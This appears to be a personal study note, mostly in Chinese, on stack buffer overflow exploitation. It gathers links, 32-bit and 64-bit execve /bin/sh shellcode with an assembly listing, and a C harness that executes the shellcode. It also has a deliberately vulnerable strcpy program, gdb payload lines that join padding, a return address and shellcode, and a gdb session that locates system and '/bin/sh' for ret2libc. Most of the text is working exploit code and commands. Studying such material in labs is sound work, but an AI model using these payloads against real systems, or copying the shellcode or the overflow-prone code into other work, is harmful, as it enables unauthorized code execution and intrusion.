https://blog.csdn.net/leeshunpeng/article/details/80082931
https://zhuanlan.zhihu.com/p/25816426

shellcode:
http://blog.nsfocus.net/easy-implement-shellcode-xiangjie/
https://zhuanlan.zhihu.com/p/25892385
movw array(%ebx, %eax, 4), %cx   //相当于 Intel: mov cx, [ebx + 4*eax + array]
32位：\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
64位：\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05

/*
    #
    # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes)
    #
    # Dying to be the shortest.
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 27 April 2015
    #
    # GPL
    #
 
 
    .global _start
_start:
    # char *const argv[]
    xorl %esi, %esi
 
    # 'h' 's' '/' '/' 'n' 'i' 'b' '/'
    movq $0x68732f2f6e69622f, %rbx
 
    # for '\x00'
    pushq %rsi
 
    pushq %rbx
 
    pushq %rsp
    # const char *filename
    popq %rdi
 
    # __NR_execve 59
    pushq $59
    popq %rax
 
    # char *const envp[]
    xorl %edx, %edx
 
    syscall
 */
 
/*
  gcc -z execstack push64.c
 
  uname -r
  3.19.3-3-ARCH
 */
 
#include <stdio.h>
#include <string.h>
 
int
main(void)
{
  char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";
 
  printf("strlen(shellcode)=%d\n", strlen(shellcode));
 
  ((void (*)(void))shellcode)();
 
  return 0;
}

ss：函数调用栈地址（stack segment）
cs：代码段地址（code segment）
ds：数据段地址（data segment）
 
eip：下一条运行指令地址
 
 
mov    0x8(%ebp),%eax
（ebp所在的地址 + 0x8偏移），取出里面的数据 赋值给eax


#include <stdio.h>
#include <string.h>
 
void my_strcpy(char *name)
{
  char tmpName[60];
  strcpy(tmpName, name);
  printf("Hello %s\n", tmpName);
}
 
 
int main(int argc, char** argv)
{
  my_strcpy(argv[1]);
  return 0;
}
 
 
 
set args  `python -c 'print "A" * 260'`
 
set args  `python -c 'print "A" * 268 + "\xe0\xd6\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
 
strcpy会在最后自动添加\0
 
计算公式: ebp - buff + 4

32-bit:
gcc -o 1 1.c -g -fno-stack-protector -m32 -z execstackp
set args  `python -c 'print "A" * 64 + "\x90\xd7\xff\xff" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
64-bit:
python -c 'print "A" * 72 + "\x00\x00\xff\xff\xff\x7f\x00\x00" + "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"'



$ gdb ./test2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
….
(gdb) break main
Breakpoint 1 at 0x8048430
(gdb) run
Starting program: /home/mzheng/CTF/groupstudy/test/test2
 
Breakpoint 1, 0x08048430 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e5f460 <system>
(gdb) print __libc_start_main
$2 = {<text variable, no debug info>} 0xb7e393f0 <__libc_start_main>
(gdb) find 0xb7e393f0, +2200000, "/bin/sh"(gdb如果安装有peda插件貌似这跳命令找不到)
0xb7f81ff8
warning: Unable to access target memory at 0xb7fc8500, halting search.
1 pattern found.
(gdb) x/s 0xb7f81ff8
